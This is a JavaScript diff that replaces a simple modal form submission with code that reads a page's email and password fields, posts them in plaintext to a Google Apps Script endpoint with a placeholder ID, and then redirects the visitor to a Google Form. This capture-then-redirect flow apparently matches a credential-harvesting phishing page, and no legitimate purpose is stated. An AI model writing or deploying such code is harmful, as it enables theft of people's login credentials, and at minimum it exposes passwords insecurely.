@@ -1,45 +1,37 @@
-// Function to show the modal
-function showModal(message) {
-    var modal = document.getElementById("myModal");
-    var modalMessage = document.getElementById("modalMessage");
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("userForm");
 
+    form.addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent default form submission
 
+        // Get form values
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
 
-    // Set the message in the modal
-    modalMessage.textContent = message;
+        // Prepare data to send
+        const formData = new FormData();
+        formData.append("email", email);
+        formData.append("password", password);
 
-    // Show the modal
-    modal.style.display = "block";
+        // Google Apps Script endpoint to save data
+        const scriptURL = "https://script.google.com/macros/s/AKfycbw_YOUR_SCRIPT_ID/exec";
 
-    // Add event listener to close the modal when the close button is clicked
-    var closeButton = document.getElementsByClassName("close")[0];
-    closeButton.addEventListener("click", function() {
-      modal.style.display = "none";
+        // Send data using fetch API
+        fetch(scriptURL, {
+            method: "POST",
+            body: formData,
+        })
+            .then((response) => {
+                if (response.ok) {
+                    // Redirect to the Google Form
+                    window.location.href = "https://forms.google.com/YOUR_FORM_URL";
+                } else {
+                    alert("Error saving data. Please try again.");
+                }
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+                alert("Error saving data. Please try again.");
+            });
     });
-  }
-
-  // Add event listener to the form submission
-  document.getElementById("myForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent the default form submission
-
-    // Show the modal immediately to indicate form submission is in progress
-    showModal("Submitting form...");
-
-    // Perform an AJAX request to submit the form
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", this.action);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
-        if (xhr.status === 200) {
-          // Successful response
-          var response = xhr.responseText;
-          showModal(response); // Show the modal with the response message
-          document.getElementById("myForm").reset(); //Clear the form fields
-        } else {
-          // Error response
-          showModal("Error: Something went wrong."); // Show a generic error message
-        }
-      }
-    };
-    xhr.send(new FormData(this));
-  });
+});
